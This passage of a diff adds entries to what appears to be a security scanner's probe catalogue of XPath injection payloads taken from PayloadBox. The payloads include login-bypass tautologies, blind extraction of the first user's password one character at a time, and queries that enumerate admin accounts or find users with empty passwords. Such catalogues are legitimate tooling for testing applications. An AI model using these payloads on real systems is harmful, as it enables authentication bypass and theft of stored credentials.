+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or system-property('xsl:version') or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0178",
+    "name": "Xpath Injection #178",
+    "template": "' or system-property('xsl:vendor') or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or system-property('xsl:vendor') or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0179",
+    "name": "Xpath Injection #179",
+    "template": "' or document-uri(/) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or document-uri(/) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0180",
+    "name": "Xpath Injection #180",
+    "template": "' or base-uri(/*[1]) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or base-uri(/*[1]) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0181",
+    "name": "Xpath Injection #181",
+    "template": "' or substring(//user[1]/password,1,1)=char(97) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or substring(//user[1]/password,1,1)=char(97) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0182",
+    "name": "Xpath Injection #182",
+    "template": "' or string-to-codepoints(//user[1]/name)[1]=97 or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or string-to-codepoints(//user[1]/name)[1]=97 or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0183",
+    "name": "Xpath Injection #183",
+    "template": "' or codepoints-to-string(97) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or codepoints-to-string(97) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0184",
+    "name": "Xpath Injection #184",
+    "template": "' or collection() or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or collection() or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0185",
+    "name": "Xpath Injection #185",
+    "template": "' or collection('users') or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or collection('users') or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0186",
+    "name": "Xpath Injection #186",
+    "template": "' or //user[name instance of xs:string] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[name instance of xs:string] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0187",
+    "name": "Xpath Injection #187",
+    "template": "' or //user[id castable as xs:integer] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[id castable as xs:integer] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0188",
+    "name": "Xpath Injection #188",
+    "template": "' or //user[role='admin' or role='superuser'] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[role='admin' or role='superuser'] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0189",
+    "name": "Xpath Injection #189",
+    "template": "' or //user[id>0 and id<100] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[id>0 and id<100] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0190",
+    "name": "Xpath Injection #190",
+    "template": "' or //user[status!='disabled'] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[status!='disabled'] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0191",
+    "name": "Xpath Injection #191",
+    "template": "' or not(//user[name]) or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or not(//user[name]) or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0192",
+    "name": "Xpath Injection #192",
+    "template": "' or //user[not(password)] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[not(password)] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0193",
+    "name": "Xpath Injection #193",
+    "template": "' or //user[string-length(password)=0] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //user[string-length(password)=0] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0194",
+    "name": "Xpath Injection #194",
+    "template": "' or '1'='1' or \"1\"=\"1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or '1'='1' or \"1\"=\"1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0195",
+    "name": "Xpath Injection #195",
+    "template": "' or 1=1 or '1'='1' or \"1\"=\"1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or 1=1 or '1'='1' or \"1\"=\"1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0196",
+    "name": "Xpath Injection #196",
+    "template": "') or ('1'='1') or (\"1\"=\"1",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ') or ('1'='1') or (\"1\"=\"1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0197",
+    "name": "Xpath Injection #197",
+    "template": "' or //item[key='value'] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //item[key='value'] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  },
+  {
+    "id": "xml-injection-pbox-0198",
+    "name": "Xpath Injection #198",
+    "template": "' or //root/data[field='test'] or ''='",
+    "description": "XML Injection probe from PayloadBox (xpath-injection.txt). Tests application handling of: ' or //root/data[field='test'] or ''='",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "xpath-injection.txt"
+  }
+]
